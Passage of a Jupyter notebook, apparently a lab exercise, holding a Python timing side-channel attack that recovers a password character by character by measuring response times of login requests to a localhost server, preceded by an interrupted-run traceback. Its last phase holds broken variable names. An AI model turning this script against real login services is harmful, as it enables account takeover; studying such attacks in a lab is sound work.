\u001b[49m\u001b[43mheaders\u001b[49m\u001b[43m=\u001b[49m\u001b[43mheaders\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    794\u001b[39m \u001b[43m    \u001b[49m\u001b[43mchunked\u001b[49m\u001b[43m=\u001b[49m\u001b[43mchunked\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    795\u001b[39m \u001b[43m    \u001b[49m\u001b[43mretries\u001b[49m\u001b[43m=\u001b[49m\u001b[43mretries\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    796\u001b[39m \u001b[43m    \u001b[49m\u001b[43mresponse_conn\u001b[49m\u001b[43m=\u001b[49m\u001b[43mresponse_conn\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    797\u001b[39m \u001b[43m    \u001b[49m\u001b[43mpreload_content\u001b[49m\u001b[43m=\u001b[49m\u001b[43mpreload_content\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    798\u001b[39m \u001b[43m    \u001b[49m\u001b[43mdecode_content\u001b[49m\u001b[43m=\u001b[49m\u001b[43mdecode_content\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    799\u001b[39m \u001b[43m    \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mresponse_kw\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    800\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    802\u001b[39m \u001b[38;5;66;03m# Everything went great!\u001b[39;00m\n\u001b[32m    803\u001b[39m clean_exit = \u001b[38;5;28;01mTrue\u001b[39;00m\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\urllib3\\connectionpool.py:534\u001b[39m, in \u001b[36mHTTPConnectionPool._make_request\u001b[39m\u001b[34m(self, conn, method, url, body, headers, retries, timeout, chunked, response_conn, preload_content, decode_content, enforce_content_length)\u001b[39m\n\u001b[32m    532\u001b[39m \u001b[38;5;66;03m# Receive the response from the server\u001b[39;00m\n\u001b[32m    533\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m534\u001b[39m     response = \u001b[43mconn\u001b[49m\u001b[43m.\u001b[49m\u001b[43mgetresponse\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    535\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m (BaseSSLError, \u001b[38;5;167;01mOSError\u001b[39;00m) \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[32m    536\u001b[39m     \u001b[38;5;28mself\u001b[39m._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\urllib3\\connection.py:516\u001b[39m, in \u001b[36mHTTPConnection.getresponse\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m    513\u001b[39m _shutdown = \u001b[38;5;28mgetattr\u001b[39m(\u001b[38;5;28mself\u001b[39m.sock, \u001b[33m\"\u001b[39m\u001b[33mshutdown\u001b[39m\u001b[33m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m)\n\u001b[32m    515\u001b[39m \u001b[38;5;66;03m# Get the response from http.client.HTTPConnection\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m516\u001b[39m httplib_response = \u001b[38;5;28;43msuper\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\u001b[43m.\u001b[49m\u001b[43mgetresponse\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    518\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    519\u001b[39m     assert_header_parsing(httplib_response.msg)\n",
            "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\http\\client.py:1430\u001b[39m, in \u001b[36mHTTPConnection.getresponse\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m   1428\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m   1429\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m-> \u001b[39m\u001b[32m1430\u001b[39m         \u001b[43mresponse\u001b[49m\u001b[43m.\u001b[49m\u001b[43mbegin\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1431\u001b[39m     \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mConnectionError\u001b[39;00m:\n\u001b[32m   1432\u001b[39m         \u001b[38;5;28mself\u001b[39m.close()\n",
            "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\http\\client.py:331\u001b[39m, in \u001b[36mHTTPResponse.begin\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m    329\u001b[39m \u001b[38;5;66;03m# read until we get a non-100 response\u001b[39;00m\n\u001b[32m    330\u001b[39m \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m331\u001b[39m     version, status, reason = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_read_status\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    332\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m status != CONTINUE:\n\u001b[32m    333\u001b[39m         \u001b[38;5;28;01mbreak\u001b[39;00m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\http\\client.py:292\u001b[39m, in \u001b[36mHTTPResponse._read_status\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m    291\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34m_read_status\u001b[39m(\u001b[38;5;28mself\u001b[39m):\n\u001b[32m--> \u001b[39m\u001b[32m292\u001b[39m     line = \u001b[38;5;28mstr\u001b[39m(\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mfp\u001b[49m\u001b[43m.\u001b[49m\u001b[43mreadline\u001b[49m\u001b[43m(\u001b[49m\u001b[43m_MAXLINE\u001b[49m\u001b[43m \u001b[49m\u001b[43m+\u001b[49m\u001b[43m \u001b[49m\u001b[32;43m1\u001b[39;49m\u001b[43m)\u001b[49m, \u001b[33m\"\u001b[39m\u001b[33miso-8859-1\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m    293\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(line) > _MAXLINE:\n\u001b[32m    294\u001b[39m         \u001b[38;5;28;01mraise\u001b[39;00m LineTooLong(\u001b[33m\"\u001b[39m\u001b[33mstatus line\u001b[39m\u001b[33m\"\u001b[39m)\n",
            "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\socket.py:719\u001b[39m, in \u001b[36mSocketIO.readinto\u001b[39m\u001b[34m(self, b)\u001b[39m\n\u001b[32m    717\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mOSError\u001b[39;00m(\u001b[33m\"\u001b[39m\u001b[33mcannot read from timed out object\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m    718\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m719\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_sock\u001b[49m\u001b[43m.\u001b[49m\u001b[43mrecv_into\u001b[49m\u001b[43m(\u001b[49m\u001b[43mb\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    720\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m timeout:\n\u001b[32m    721\u001b[39m     \u001b[38;5;28mself\u001b[39m._timeout_occurred = \u001b[38;5;28;01mTrue\u001b[39;00m\n",
            "\u001b[31mKeyboardInterrupt\u001b[39m: "
          ]
        }
      ],
      "source": [
        "import time\n",
        "import string\n",
        "import requests\n",
        "from statistics import median, stdev\n",
        "from datetime import datetime\n",
        "\n",
        "BASE_URL = \"http://localhost\"\n",
        "USERNAME = \"208009845\"\n",
        "CHARSET = string.ascii_lowercase\n",
        "CHARSET_LENGTH = 26\n",
        "REPEATS = 1\n",
        "MIN_SAMPLES_FOR_EARLY_STOP = 5\n",
        "PASSWORD_LENGTH = 11\n",
        "DIFFICULTY = 0\n",
        "\n",
        "def time_request(password_guess):\n",
        "    if DIFFICULTY == 0:\n",
        "        url = f\"{BASE_URL}/?user={USERNAME}&password={password_guess}\"\n",
        "    else:\n",
        "        url = f\"{BASE_URL}/?user={USERNAME}&password={password_guess}&difficulty={DIFFICULTY}\"\n",
        "    start = time.time()\n",
        "    response = requests.get(url)\n",
        "    end = time.time()\n",
        "    return end - start, response.text.strip()\n",
        "\n",
        "def log_result(password, password_tries, time):\n",
        "    with open('results.txt','a') as f:\n",
        "        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')\n",
        "        LOCAL = \"localhost\" in BASE_URL or \"127.0.0.1\" in BASE_URL\n",
        "        f.write(f\"name: {USERNAME}, local: {LOCAL}, password length: {PASSWORD_LENGTH}, difficulty: {DIFFICULTY}, repeats: {REPEATS}, password: {password}, time: {int(time)//60}m{int(time)%60}s, passwword tries: {password_tries}, logged at: {now}\\n\")\n",
        "\n",
        "def guess_password():\n",
        "    start_time_all_password = time.time()\n",
        "    guessed_password = \"\"\n",
        "    password_tries = 0 \n",
        "    min_margin_seconds = 0.25  # minimum difference between top 2 medians to trigger early stop\n",
        "    print(f\"\\n[+] Guessing character at position 1\")\n",
        "    timings = []\n",
        "    timings_per_position = []\n",
        "    indexes_list = []\n",
        "    for i, c in enumerate(CHARSET):\n",
        "        trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)\n",
        "        times_list = []\n",
        "        for _ in range(REPEATS):\n",
        "            response_time, response = time_request(trial)\n",
        "            if response == \"1\":\n",
        "                log_result(trial, password_tries, time.time() - start_time_all_password)\n",
        "                return trial\n",
        "            times_list.append(pow((response_time + 5), 2))\n",
        "        med_time = median(times_list)\n",
        "        timings.append((med_time, c))\n",
        "\n",
        "        print(f\"    Tried '{trial}' | Median Time: {med_time:.5f}s\")\n",
        "\n",
        "    # Early stopping based on timing separation from second best\n",
        "    timings = sorted(timings, reverse=True)\n",
        "    best_timing, best_char = timings[0]\n",
        "    second_best_timing, _ = timings[1]\n",
        "    third_best_timing, _ = timings[2]\n",
        "    min_margin_seconds = (((best_timing - second_best_timing) + (best_timing - third_best_timing)) / 2) * 0.5\n",
        "    password_tries += (i + 1)*REPEATS\n",
        "    timings_per_position.append(timings)\n",
        "    if best_timing - second_best_timing > min_margin_seconds:\n",
        "        print(f\"[✓] Early outlier: '{best_char}' (margin {best_timing - second_best_timing:.5f}s > {min_margin_seconds}s)\")\n",
        "        guessed_password += best_char\n",
        "    else:\n",
        "        # No early stopping — pick the best overall\n",
        "        indexes_list.append(0)\n",
        "        best_char = max(timings, key=lambda x: x[0])[1] \n",
        "    position = 1\n",
        "    while True:\n",
        "        # for position in range(1, PASSWORD_LENGTH - 1):\n",
        "        if position <= PASSWORD_LENGTH:\n",
        "            print(f\"\\n[+] Guessing character at position {position + 1}\")\n",
        "            timings = []\n",
        "            min_samples_to_early_stop = 3 if position <= 10 else 5\n",
        "            \n",
        "            for i, c in enumerate(CHARSET):\n",
        "                trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)\n",
        "\n",
        "                #times_list = [time_request(trial)[0] for _ in range(REPEATS)]\n",
        "                times_list = []\n",
        "                for _ in range(REPEATS):\n",
        "                    response_time, response = time_request(trial)\n",
        "                    if response == \"1\":\n",
        "                        log_result(trial, password_tries, time.time() - start_time_all_password)\n",
        "                        return trial\n",
        "                    times_list.append(pow((response_time + 5), 2))\n",
        "                med_time = median(times_list)\n",
        "                timings.append((med_time, c))\n",
        "\n",
        "                print(f\"    Tried '{trial}' | Median Time: {med_time:.5f}s\")\n",
        "\n",
        "                # Early stopping based on timing separation from second best\n",
        "                if i + 1 >= min_samples_to_early_stop:\n",
        "                    timings = sorted(timings, reverse=True)\n",
        "                    best_timing, best_char = timings[0]\n",
        "                    second_best_timing, _ = timings[1]\n",
        "\n",
        "                    if best_timing - second_best_timing > min_margin_seconds:\n",
        "                        print(f\"[✓] Early outlier: '{best_char}' (margin {best_timing - second_best_timing:.5f}s > {min_margin_seconds}s)\")\n",
        "                        guessed_password += best_char\n",
        "                        timings_per_position.append(timings)\n",
        "                        password_tries += (i + 1)*REPEATS\n",
        "                        break\n",
        "                if i == CHARSET_LENGTH: #didn't found any char\n",
        "                    # No early stopping — pick the best overall\n",
        "                    timings_per_position.append(timings)\n",
        "                    indexes_list.append(position)\n",
        "                    best_timing, best_char = timings[0]\n",
        "                    print(\n",
        "                        f\"selected the max outlier: '{best_char}' (time: {best_timing:.5f}s\")\n",
        "                    guessed_password += best_char\n",
        "                    password_tries += (i + 1)*REPEATS\n",
        "        else: # Last iteration\n",
        "            print(f\"\\n[+] Guessing character at position {position + 1}\")\n",
        "\n",
        "        \n",
        "            # for i, c in enumerate(CHARSET):\n",
        "            #     trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)\n",
        "\n",
        "            #     _, output = time_request(trial)\n",
        "            #     if output == \"1\":\n",
        "            #         password_tries += (i + 1)*REPEATS\n",
        "            #         log_result(trial, password_tries, time.time() - start_time_all_password)\n",
        "            #         return trial\n",
        "            #     print(f\"    Tried '{trial}'\")\n",
        "            \n",
        "            for i in indexes_list:\n",
        "                _ , second_best_char = timings_per_position[i][1]\n",
        "                _ , third_best_char = timings_per_position[i][2]\n",
        "                trail1 = trail2 = trail\n",
        "                trail1[i] = second_best_char\n",
        "                _, output1 = time_request(trial1)\n",
        "                if output1 == \"1\":\n",
        "                    password_tries += (i + 1)*REPEATS\n",
        "                    log_result(trial, password_tries, time.time() - start_time_all_password)\n",
        "                    return trial\n",
        "                trail2[i] = third_best_char\n",
        "                _, output2 = time_request(trial)\n",
        "                \n",
        "                print(f\"    Tried '{trial}'\")\n",
        "\n",
        "    \n",
        "\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    password = guess_password()\n",
        "    \n",
        "    print(f\"\\n[✓] The password is {password}\")\n",
        "\n",
        "# to calculate the median instead of avg\n",
        "# at first find the difference between the max and the min and define as the margin\n",
        "# each time we multiply the margin by let's say 0.8/0.85\n",
        "# calc at least 3 or 5 chars to determine the result"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": ".venv",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.13.2"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
